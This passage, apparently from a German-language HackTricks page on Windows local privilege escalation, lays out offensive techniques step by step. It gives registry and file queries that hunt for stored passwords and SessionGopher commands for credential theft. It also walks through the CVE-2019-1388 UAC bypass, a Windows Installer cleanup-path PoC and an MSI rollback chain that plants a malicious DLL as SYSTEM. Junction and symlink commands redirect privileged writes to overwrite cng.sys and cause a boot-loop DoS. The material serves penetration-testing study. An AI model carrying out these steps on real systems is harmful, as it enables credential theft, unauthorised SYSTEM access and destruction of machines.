where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools zur Suche nach Passwörtern

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das auf dem Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die Passwörter enthalten, die auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) **mit Vollzugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, der alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **Vollzugriff auf den Prozess mit niedrigen Rechten hast**, kannst du dir das **offene Handle des mit `OpenProcess()` erstellten privilegierten Prozesses** schnappen und **Shellcode injizieren**.\
[In diesem Beispiel erfährst du mehr darüber, **wie du diese Schwachstelle erkennst und ausnutzt**.](leaked-handle-exploitation.md)\
[Dieser **andere Beitrag erklärt ausführlicher, wie du weitere offene Handles von Prozessen und Threads testest und missbrauchst, die mit unterschiedlichen Berechtigungsstufen vererbt wurden (nicht nur mit Vollzugriff)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speicherbereiche, sogenannte **Pipes**, ermöglichen die Prozesskommunikation und den Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht miteinander verbundene Prozesse Daten austauschen können, sogar über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named-Pipe-Server** und **Named-Pipe-Client** definiert sind.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Rechte zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem das **Abfangen der Kommunikation über eine Named Pipe mit einem Tool wie Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privilege Escalation-Möglichkeiten zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) macht im Servermodus `\\pipe\\tapsrv` (MS-TRP) verfügbar. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in eine beliebige vorhandene Datei umzuwandeln, die für `NETWORK SERVICE` beschreibbar ist. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, der auf einen vorhandenen, beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei über `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere mit `LRegisterRequestRecipient` (`Req_Func 61`) eine Line-App, löse `TRequestMakeCall` (`Req_Func 121`) aus, rufe die Ereignisse mit `GetAsyncEvents` (`Req_Func 0`) ab und hebe dann die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Verschiedenes

### Dateierweiterungen, mit denen sich unter Windows Dinge ausführen lassen

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Missbrauch von Protocol Handlern und ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, kann es geplante Tasks oder andere ausgeführte Prozesse geben, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Rechten zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es bei einigen Versionen von Microsoft Windows möglich, als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ auszuführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Rechte zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Sicherheitslücke auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Du hast alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lies dies, um **mehr über Integrity Levels zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend dies, um **mehr über UAC und UAC Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit niedrigen Berechtigungen dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen kann, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang über die Junction in ein Webverzeichnis geleitet werden. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein beweist dies nicht.

Prüfe die genaue Pfadbildung und den Zeitpunkt im Upload-Handler, die effektiven Berechtigungen des Benutzers zum Löschen und Erstellen des Unterverzeichnisses, die effektiven ACLs des Ziels, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Bestätige die Prozessidentitäten des Schreibers und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen zukünftigen Junction-Austausch belegen. Wenn die Ausführung bei einem Dienstkonto landet, prüfe das **tatsächliche Prozesstoken**, bevor du einen separaten Token-Privilege-Angriffsweg in Betracht ziehst.

## Von beliebigem Löschen/Verschieben/Umbenennen von Ordnern zu SYSTEM-EoP

Die in [**diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit dem [**hier verfügbaren Exploit-Code**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` gekapert wird. Windows Installer verwendet diesen Ordner später, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern. Dabei werden die Rollback-Dateien so manipuliert, dass sie die schädliche Payload enthalten.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Ein Client mit niedrigen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Durch Reverse Engineering wurden die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50` identifiziert. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können sich je nach Build unterscheiden.<sup>[[41]](#references)</sup>

Bei einem Nicht-Administrator führt `SetEEUIDirectoryAndFilter` nur während des Öffnens des angegebenen Pfads eine Impersonation des Aufrufers durch. Dabei werden `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT` verwendet. Dies belegt, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Es verknüpft jedoch **nicht** das geprüfte Dateiobjekt mit der späteren Bereinigung und beweist auch nicht, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` einen benannten `REG_DWORD`-Wert: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und der Datenwert `0x00000002` kennzeichnet den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der Worker mit erhöhten Berechtigungen zählt die Registrierungswerte auf und übergibt Ordnereinträge an `FDeleteFolder`, das rekursiv löscht, ohne die Herkunft des Pfads zu prüfen. Wenn das normale Entfernen fehlschlägt, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` ermittelte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung des Pfads und nicht eine Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten neu erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für das Vertrauen in Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Bewahre den separaten Eintrag `Installer\Folders`, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Mit dem zuvor geöffneten Handle lässt sich über `NtSetSecurityObject` eine permissive DACL wiederherstellen. Danach kann die generierte `.rbs` ersetzt werden, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad behoben, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg melden, fügt den vom Angreifer kontrollierten Pfad aber nicht mehr zu `TempPackages` hinzu. Installiere die Windows-Sicherheitsupdates vom April 2025, statt eine erfolgreiche Rückgabe der Methode als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijack (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Administratorrechte** ihn ausführen kann.
    - Lass nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Sicherungen) umzubenennen.
    - **Überwache das geöffnete Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - dann auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eintrifft, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch **wird verhindert, dass sie gelöscht wird**.
    - Sende dann **ein Signal zurück**, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche als Angreifer die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer und bereit für den Hijack**.

> **Löse jetzt die SYSTEM-Schwachstelle zum Löschen beliebiger Ordner aus**, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird erneut zum Auslösen eines **Rollbacks** verwendet, bei dem `.rbs` und `.rbf` gelesen werden.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Notiere ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - dann **wartet**, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach Erhalt des Ereignisses `.rbs created`:
        - **wendet Windows Installer erneut starke ACLs** auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, sodass du weiterhin in den Ordner schreiben kannst.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen DLL-Nutzlast auf SYSTEM-Ebene** ab.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungssignal, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir eingeschleuste DLL lädt.
    - **Geschafft**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Datei-Löschen/Verschieben/Umbenennen zu SYSTEM-EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Schwachstelle nur das **beliebige Löschen von Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner verfügt über einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschen**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Dazu können Sie standardmäßige APIs zum Löschen von Dateien verwenden, etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine API zum Löschen einer *Datei* aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen des Ordnerinhalts zu SYSTEM EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert — wird er gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch jetzt löscht er aufgrund der Junction + Symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung beliebiger Ordner zu permanentem DoS

Nutze ein Primitive, mit dem du **einen beliebigen Ordner als SYSTEM/admin erstellen** kannst – selbst wenn du **keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner erstellen**, kann Windows beim Start den eigentlichen Treiber nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Starts zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Start an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Startreparatur oder Zugriff auf den Datenträger).

### Von privilegierten Log-/Backup-Pfaden + OM-Symlinks zu beliebigem Überschreiben von Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mithilfe von **Object Manager symlinks + NTFS mount points** umleiten und so den privilegierten Schreibvorgang in ein beliebiges Überschreiben von Dateien verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration mit dem Zielpfad ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente den Log schreibt (z. B. indem ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Boot-Loop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann zuerst versucht werden, diese zu laden. Dadurch ist sie ein zuverlässiges DoS-Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Weg zu SYSTEM** einfach sein: **Erstelle und starte einen neuen Dienst**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen eines Dienst-Binaries darauf, dass es ein gültiger Dienst ist oder das Binary die erforderlichen Aktionen schnell ausführt, da es nach 20 Sekunden beendet wird, wenn es kein gültiger Dienst ist.

### AlwaysInstallElevated

Von einem Prozess mit hoher Integrität aus könntest du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und über einen _**.msi**_-Wrapper eine Reverse Shell zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Privilegien verfügst (wahrscheinlich findest du sie in einem Prozess mit hoher Integrität), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (keine geschützten Prozesse), das **Token** des Prozesses **kopieren** und mit diesem Token einen **beliebigen Prozess erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Privilegien läuft** (_ja, du kannst SYSTEM-Prozesse finden, die nicht über alle Token-Privilegien verfügen_).\
**Ein** [**Codebeispiel zur Ausführung der beschriebenen Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Rechteausweitung in `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Dienst erstellt oder missbraucht, damit er in diese Pipe schreibt**. Danach kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, **das Token** des Pipe-Clients (des Dienstes) **imitieren** und so SYSTEM-Privilegien erhalten.\
Wenn du [**mehr über Named Pipes erfahren möchtest, lies dies**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von hoher Integrität zu System gelangst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **kapern**, die von einem **Prozess** mit **SYSTEM**-Rechten **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking eignet sich daher ebenfalls für diese Art der Rechteausweitung. Außerdem ist es **von einem Prozess mit hoher Integrität aus viel einfacher**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool zur Suche nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
